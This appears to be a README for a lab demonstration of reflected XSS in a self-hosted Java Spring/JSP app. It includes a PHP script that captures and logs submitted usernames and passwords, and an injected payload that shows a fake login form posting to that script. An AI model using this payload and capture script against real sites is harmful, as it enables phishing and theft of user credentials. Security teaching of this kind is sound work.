
---

## 🔧 Technologies Used

- Java Spring MVC + JSP (Tomcat)
- PHP (capture script)
- Browser-based DOM XSS exploitation
- URL encoding for payload delivery

---

## 🚀 How to Run

### ✅ Part 1: Host the Vulnerable Web App
1. Deploy the Java Spring app on Tomcat.
2. Make sure `index.jsp` reflects user input from a query string (`?studentName=`).

### ✅ Part 2: Host the Credential Capture Script
1. Create a file `capture.php`:
   ```php
   <?php
   if ($_SERVER["REQUEST_METHOD"] == "POST") {
       $username = htmlspecialchars($_POST["username"]);
       $password = htmlspecialchars($_POST["password"]);
       echo "<h2>Captured Credentials</h2>";
       echo "Username: $username<br>Password: $password<br>";
       file_put_contents("creds.txt", "Username: $username | Password: $password\n", FILE_APPEND);
   }
   ?>


## Start the PHP server and make sure you get the POST request once after capturing the cred
php -S 0.0.0.0:8000





## Form action in your XSS payload should point to:
http://localhost:8000/capture.php


## Paste the payload in to the query
/*
"><script>alert('Please login first');</script>
<h3>LOGIN</h3>
<form action='http://localhost:8000/capture.php' method='post'>
  <label>Username:</label><input type='text' name='username'>
  <label>Password:</label><input type='password' name='password'>
  <input type='submit' value='Login'>
</form>
*/



